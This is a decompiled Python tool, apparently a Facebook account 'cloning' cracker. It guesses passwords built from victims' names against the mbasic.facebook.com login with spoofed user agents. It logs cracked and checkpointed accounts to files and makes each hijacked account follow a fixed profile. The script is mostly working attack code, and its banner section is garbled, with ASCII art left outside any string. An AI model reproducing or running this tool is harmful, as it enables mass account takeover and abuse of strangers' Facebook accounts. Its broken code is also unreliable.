# Decompile by AKASH (Tools By AKASH-DECORDER,PRO)
# Time Succes decompile : 2022-04-28 17:34:47.432353
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as kausarssb
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
ugen=[]

for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
def logo():
	color_logo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\x1b[38;5;208m'])
 █████╗ ██╗  ██╗ █████╗ ███████╗██╗  ██╗
██╔══██╗██║ ██╔╝██╔══██╗██╔════╝██║  ██║
███████║█████╔╝ ███████║███████╗███████║
██╔══██║██╔═██╗ ██╔══██║╚════██║██╔══██║
██║  ██║██║  ██╗██║  ██║███████║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝90m│\n\033[1;97m┌━━━━━━━━━━━━━━━━━━\x1b[38;5;208m⊱\033[34;1m   \033[37;1m⊰\x1b[38;5;208m━━━━━━━━━━━━━━━━━━┐  \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝙉\033[00m\033[1;90m│\033[1;92m┣\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30m𝘈𝘜𝘛𝘏𝘖𝘙        \033[1;35m:  \033[1;37mAKASH AHMED      \x1b[38;5;208m│  \033[1;92m┫\033[1;90m│\033[1;91m\033[47m𝘿\033[00m\033[1;90m│\033[1;92m┣\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;35m:  \033[1;37mAKASHcyber999      \x1b[38;5;208m│   \033[1;97m┗━┛\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗      \033[1;35m:  \033[1;37m01971214358       \x1b[38;5;208m│\n\033[1;97m│ \033[37;1m[\033[1;31m>_\033[1;37m] \033[1;30m𝘗𝘖𝘞𝘌𝘙         \033[1;35m:  \033[1;31mA K A S H    \x1b[38;5;208m│\n\033[1;97m└━━━━━━━━━━━━━━━━━━\x1b[38;5;208m⊱\033[34;1m   \033[37;1m⊰\x1b[38;5;208m━━━━━━━━━━━━━━━━━━┘\n\t\t \033[1;30m[\033[1;32m\033[1;47mAKASH\033[00m\033[1;30m] """)

          

def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92mKAUSAR_OK.txt' % (H, P, str(len(ok))))
	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91mKAUSAR_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;92mPRESS ENTER TO BACK MENU ")
	    kausar()

def mr_kausar():




        
  
    os.system('clear')
    logo()
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print
    print('\033[0;92m [1] START FILE CLONING [ JUST NOW LOGIN ]')
    print('\033[0;93m [2] DUMP-MAKE FILE')
    print('\033[0;96m [3] EXIT ')
    print('')
    _AKASH___ = input('\033[0;95m [?] CHOOSE OPTION : ')
    if _AKASH___ in ('1', '01'):
        __xxx__().kausarx(id)
    if _AKASH___ in ('2', '02'):
        os.system('python Psycho.py')
    if _AKASH___ in ('3', '03'):
        pass


class __xxx__:
    def __init__(self):
        self.id = []
    def kausarx(self,id):
  
       
      
         
            

        os.system("clear")
        logo()
        self.cnt = input('ENTER FILE NAME : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        logo()
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [!] CHOOSE CORRECT ONE');
            self.kausarx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r[➣]\x1b[1;92m[HE4ON] {loop}|{len(self.id)} [ok][{len(ok)}]")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                AKASH=random.choice(ugen)
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent": AKASH,
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"navigate",
                    "sec-fetch-user":"?1",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-US,en;q=0.9"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent": AKASH,
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"navigate",
                    "sec-fetch-user":"?1",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-US,en;q=0.9"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H}[HE4ON-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('HE4ON_OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s[HE4ON-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('HE4ON_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s[HE4ON-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('HE4ON_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('[1] CRACK WITH AUTO PASS ')
        print('[2] CRACK WITH NAME DIGIT PASS')
        chi = input('\n[?] CHOOSE : ')
        if chi == '':
            print('\nSELECT CORRECT ONE')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            logo()
            print("\033[1;91m\rUSE FLIGHT (airplane) MODE ON\033[1;96m")
            print(50*"-")
            print('\033[1;36mTOTAL IDS : %s ' % len(self.id))
            print('\033[1;36mCRACKING STARTED.....')
            print(50*"-")
            with kausarssb(max_workers=30) as ssbworld:
                for zsb in self.id: # PSYCHO PICCHI BANGLADESH HACKER
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                            pwx = ["786110"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            logo()
            print("\033[1;32m\rENTER LAST NAME DIGITs\033[1;32m\n")
            p1 = input('  Name + 1 : ')
            p2 = input('  Name + 2 : ')
            p3 = input('  Name + 3 : ')
            p4 = input('  Name + 4 : ')
            os.system("clear")
            logo()
            print("\033[1;31m\rUSE FLIGHT (airplane) MODE BEFORE USE\033[1;32m")
            print(50*"-")
            print('\033[1;32mTOTAL IDS : %s ' % len(self.id))
            print('\033[1;32mCRACKING STARTED.....')
            print(50*"-")
            with kausarssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Psycho Picchi Bangladesh Hacker
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()

class load:
    def __init__(self):
        _ = ''
        __ = int('30')
        ___ = int('0')
        __ -= 1
        ___ += 1
        for t in range(int("1")):
            print('\r Please Wait ....')
            sys.stdout.flush()
            time.sleep(0.1)
        print('\n')

mr_kausar()

